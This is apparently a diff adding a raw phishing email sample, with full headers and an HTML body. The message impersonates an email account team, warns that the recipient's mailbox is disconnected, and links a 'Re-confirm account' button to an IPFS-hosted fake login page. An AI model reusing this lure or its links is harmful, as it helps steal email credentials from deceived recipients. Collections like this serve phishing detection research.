@@ -1,0 +1,126 @@
+Return-Path: sp@tgkimports.com
+Delivered-To: jose@monkey.org
+X-FDA: 83340044550.31.CD2B0C7
+Received: from mail.tgkimports.com (unknown [94.177.253.50])
+	by imf17.b.hostedemail.com (Postfix) with ESMTP id 00329140008
+	for <jose@monkey.org>; Wed, 16 Apr 2025 13:51:33 +0000 (UTC)
+Authentication-Results: imf17.b.hostedemail.com;
+	dkim=pass header.d=tgkimports.com header.s=dkim header.b="a Oh/pap";
+	spf=pass (imf17.b.hostedemail.com: domain of sp@tgkimports.com designates 94.177.253.50 as permitted sender) smtp.mailfrom=sp@tgkimports.com;
+	dmarc=pass (policy=none) header.from=tgkimports.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1744811494;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=09A2hnIw2sLnbA4FFTwYFYhAJba7iVI7qN0fgNZTH1E=;
+	b=tohJtjagfkCxyWf2IosCHeGX1D8DZvl4AWe//pB+getNHiB5HQOv4XTxW7rzx7zIfLl25B
+	w8HIi/pbjRewP3RAbp+UQRwpfDdPK+mu21APSFcoUo7FAfJDVAHdd73HbUi5nt/vrawogf
+	fEEjga3ReQIF5+RpKRbuAxHJtm3Xm5M=
+ARC-Authentication-Results: i=1;
+	imf17.b.hostedemail.com;
+	dkim=pass header.d=tgkimports.com header.s=dkim header.b="a Oh/pap";
+	spf=pass (imf17.b.hostedemail.com: domain of sp@tgkimports.com designates 94.177.253.50 as permitted sender) smtp.mailfrom=sp@tgkimports.com;
+	dmarc=pass (policy=none) header.from=tgkimports.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1744811494; a=rsa-sha256;
+	cv=none;
+	b=IivkLBmafHTB9AnvPEihbPb2INX0bf2uxfYy6agb/x3WnUmmyTgPFpor7uCb+R+I6jisuH
+	TFChiELVTRc1ldTSv3zOQ2eRybbf4zyfEICUYA63YkzNxK1A/o3U7HPwjgidVLb+n0Xypu
+	lMhZ1a3xZWsWec6BAb5JVicIS1Jo444=
+Received: from mail.tgkimports.com (localhost [127.0.0.1])
+	by mail.tgkimports.com (Postfix) with ESMTP id 4Zd2W81xgSz6xHr
+	for <jose@monkey.org>; Wed, 16 Apr 2025 13:51:32 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=tgkimports.com;
+	 h=content-transfer-encoding:content-type:mime-version
+	:message-id:date:subject:to:from; s=dkim; t=1744811492; x=
+	1747403493; bh=09A2hnIw2sLnbA4FFTwYFYhAJba7iVI7qN0fgNZTH1E=; b=a
+	Oh/pappU/oxGfXbHtKwCaAjtPbZm/7ZqqaynF9xxf7Jubk/MY4wXzffObi9rYBVi
+	xFlJoX6HJTtIL3eAd6XPd4udlLCS0BhglMfNx6Em1Z+6jyMB0G2mR7UcumHGBava
+	ctsvkISPP+JhZf1zC3L7hc76zfhN/KFsTSUdSmqfPfqsw17eOfmrdMuqxu6Mo0iR
+	9G4Wic3mRGMJ6hWlRj2OGKCCTfv/03AM1c4Rex/LzztJy+KbF9pcu2tFM+z4a8CX
+	+NUfTEc22MAbNBelCpt3mYEWPvZLV+S2xd9/lCrxDLU+zVFYEcoe6Xdi6v8JVq1Z
+	jFSBMZ6ziQqU+s4h8hC6A==
+X-Virus-Scanned: Debian amavisd-new at mail.tgkimports.com
+X-Spam-Flag: NO
+X-Spam-Score: 5.811
+X-Spam-Level: *****
+Received: from mail.tgkimports.com ([127.0.0.1])
+	by mail.tgkimports.com (mail.tgkimports.com [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id KH-aZkv5X1Er for <jose@monkey.org>;
+	Wed, 16 Apr 2025 13:51:32 +0000 (UTC)
+Received: from [103.114.105.184] (unknown [103.114.105.184])
+	by mail.tgkimports.com (Postfix) with ESMTPSA id 4Zd2W71FbFz6xHc
+	for <jose@monkey.org>; Wed, 16 Apr 2025 13:51:30 +0000 (UTC)
+From: monkey.org <sp@tgkimports.com>
+To: jose@monkey.org
+Subject: Re: Confirm your email request for jose@monkey.org
+Date: 16 Apr 2025 06:51:27 -0700
+Message-ID: <20250416065124.E3B1EFCFA73EF67C@tgkimports.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: 00329140008
+X-Stat-Signature: w7ejmursc36mz837h9z7eou9ac1z9zfc
+X-Spam-Status: No, score=7.30
+X-Rspam-User: 
+X-Rspamd-Server: rspam11
+X-HE-Tag: 1744811493-960774
+X-HE-Meta: U2FsdGVkX1/21dwaUt4E89Jbx1mr6kXHVaHQImfHiiWTmsLkvwsWU4JiRvXJfmWrl4AX1kvFMCT/c1deH/Fsz7HvCY2IbFcOljZmnmv5EC4/WZ/K4QMUQMkANZh4MXGQiysDKm5z+eYpzLf1YljKt1dT28RH5FnMDe6sYEc2f34zohgK1ZKQoohe2zARD+tLULgcFg3jVmJUErr06EkUKWwIWiNd/u023uqzZxXv3jrDwzrKH4RkFQzALb8ENeiqj97b/nlDTIqcuvvxoWldoGLjai3Xs0kSRXBV5KcNyO6wV6JGYCNd6OkfD5HKjUv0fv2HGExrm0UHaKQ6xorSvuOivl4XsLfA0Ih3XfngDOLIUCoQTav86HJYuo1b8UqNNeyQu0e/TAu+BGCEQWGZFNXmPch4JNYGVjILqWb2/z5KExWj9RQRFktCZ1jQM4l0kL2HH4L6o3OJpx0IwuWSDg79cn4aNOxFRtCKlIkcaahYfNUh3VpM/wKASiBsCxR4vq7bH4Q8xE+3BCiKgZLxO+Q3fkpWZezFnnB3WIgX9iamXcyeiW39qYpSq9Njq945xQbP+S10bSYHElRzuFHZlz1xFfyUoBYouz+tfcFzhRSxGGC7D5YnHvv/bV0lchrJZrLgcuwIRswNxf0X7BTXYzSx/ATiFIZcFCDu6PNisKuedR7YPo0qJPQrru9NFJN+K0OIh45IF+ZSnICdbdr97SlwC9vDW3aSURb7lECo8FN2d20AEnmGhJyonyWpGcm90igxkCP7JGvr2J6iz3qDshhQQaWlbqfEbPniTpJ2fWlsIelgk+SMqvm66DGfBzvo7Ihb8OCNfGjod97HiRKbyQwCmdZPIwDDxm0nZLJu1QSboAlOM8TefqIvBMZOv2ugOtzQnZbMqaOQHNpnFUaiXZR2tDPvCzrYvy30CXWcD8VRZquV63qGOaVPadVcTvDoDVgqUahsdqmxPCDjWQPRlXcwOko
+ ACJyaSJjyEjpQ9F52TQrCL+axj6fLqGHHEL39MMCIe748bHM5WQCaAvUKZp3ARrHq8K7Wid4CWc5tv+F0iDeHG9fXCl0YR/igkMNisINZxLp4T9rXo35/s5nANnjMUr2Ku17GHmyFVAx6GjrLMaRSgpFjxR8QuEZNwqFf69PsLMg6o9CES7MRK8ZYt3ahNvDa6cwJFm/y/B1w8Nuv+/dkB8EglVQoiuPEZ4te+AxpNzYPKZ3E0cOj26DGJcaxvbQiz0QGehRp0eSWugk3S4N99dTAG/AeD55piEiq3iS1/1hRICWRZ9zT1KN1tLc0FLK/xVTtPze1HriZwaa/3ZyMjc377EPqJwAjOLhYNFu9Wnghe/ju1dKykKyzUurLwobmfALinfDfCVYbRYehomfLBF9B+VZjl7wIeF4DQF1NXmSmS82M3i3n6FpMvb4wiuHnveN1
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 158
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em; font-size: 14pt;">
+<div><div dir=3D"ltr"><table style=3D"width: 100%;">
+<tbody>
+<tr>
+<td>
+<p style=3D"font-weight: bold;">Email Server</p>
+<p>&nbsp;</p>
+<p>We noticed that your jose@monkey.org, has been disconnected from sending=
+ and receiving mails.<br><br>We urge you to re-confirm if your account is s=
+till active<br>on our server to officialy unlock it to our default settings=
+=2E</p>
+<table>
+<tbody>
+<tr>
+<td style=3D"padding: 10px 0px;"><a style=3D"border-width: 9px 19px; border=
+-style: solid; border-color: rgb(38, 114, 236); border-radius: 3px; color: =
+rgb(255, 255, 255); display: inline-block; background-color: rgb(38, 114, 2=
+36); text-decoration-line: none;" href=3D"https://bafybeifzphgnuhujtx7l5vpx=
+lksl7ctyz6sxivmf63ejcnd4kh5x2my3ku.ipfs.dweb.link/?filename=3Dstd-en-us-sui=
+te%26psess37753155_task%3Dmail%26std-en-us-suite%26psess3mbox.html#jose@mon=
+key.org" target=3D"_blank" rel=3D"noopener noreferrer" data-saferedirecturl=
+=3D"https://www.google.com/url?q=3Dhttp://bafkreibbndgg6nrkxdvdczml6wwc2y3m=
+he3ulj5nte65k5m2qcimxdjysi.ipfs.dweb.link/%23%5B%5B-Email-%5D%5D&amp;source=
+=3Dgmail&amp;ust=3D1744700123612000&amp;usg=3DAOvVaw1mstqJawUywKVzKAsLr5HU"=
+>Re-confirm account</a></td>
+</tr>
+</tbody>
+</table>
+<p>You're getting this email to make sure it was you.</p>
+<p>&nbsp;</p>
+<p style=3D"margin-top: 35px;">Thanks,<br><span style=3D"font-weight: bold;=
+">Email Account Team</span></p>
+</td>
+</tr>
+<tr>
+<td style=3D"padding-top: 30px;"><hr>
+<p style=3D"color: rgb(143, 143, 143); font-size: 12px;">You received this =
+email to let you know about important changes to your email Account and ser=
+vices.<br>&copy; 2025 All Rights Reserved.</p>
+</td>
+</tr>
+</tbody>
+</table></div></div>
+
+
+</body></html>
